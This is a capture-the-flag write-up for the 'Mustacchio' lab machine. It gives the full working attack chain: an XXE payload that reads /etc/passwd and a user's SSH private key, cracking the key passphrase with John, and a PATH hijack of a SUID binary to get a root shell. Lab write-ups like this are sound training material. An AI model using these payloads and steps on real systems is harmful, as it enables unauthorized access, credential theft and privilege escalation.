# Mustacchio

**Difficulty:** Easy  
**Category:** XXE, SUID, PATH Hijacking

## Enumeration

```bash
nmap -sCV -p- -v <TARGET_IP>
``` 
Open ports: 22 (SSH), 80 (HTTP), 8765 (HTTP)

Found `users.bak` on port 80. It was a SQLite database containing an admin SHA-1 hash.

```bash  
sqlite3 users.bak  
>.tables  
>SELECT * FROM users;
```
Hash: `1868xxxxxxxxxxxxx3a54d4bc5f4b`  
Credentials: `admin:*******19`

## XXE
Logged into port `8765` using the recovered credentials.

Found `/auth/dontforget.bak`, which revealed the XML structure. The application was vulnerable to XXE.

Tested XXE with:

```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<comment>
  <name>test</name>
  <author>&xxe;</author>
  <com>test</com>
</comment>
```

The response disclosed `/etc/passwd`.

Since Barry was mentioned in the source, I used XXE to read:

`file:///home/barry/.ssh/id_rsa`

This returned Barry's encrypted private SSH key.
## SSH

The encrypted SSH key was cracked using John:

```bash
chmod 600 id_rsa  
ssh2john id_rsa > id_rsa.hash  
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```
Passphrase: `ur******es`

SSH access:
```bash
ssh -i id_rsa barry@<TARGET_IP>
```
User flag:
```bash
cat user.txt
```

## Privilege Escalation

Enumerated SUID binaries:
```bash
find / -type f -perm -u=s 2>/dev/null
```
Found:

`/home/joe/live_log`

Checked the binary:

```bash
strings /home/joe/live_log
```
It executes `tail` without an absolute path, making it vulnerable to PATH Hijacking.

Created a malicious `tail`:
```bash
cd /tmp
echo -e '#!/bin/bash\n/bin/bash -p' > tail
chmod +x tail
```
Hijacked PATH:
```bash
export PATH=/tmp:$PATH
```
Executed the SUID binary:
```bash
/home/joe/live_log
```
Verified privileges:

```bash
id
cat /root/root.txt
```
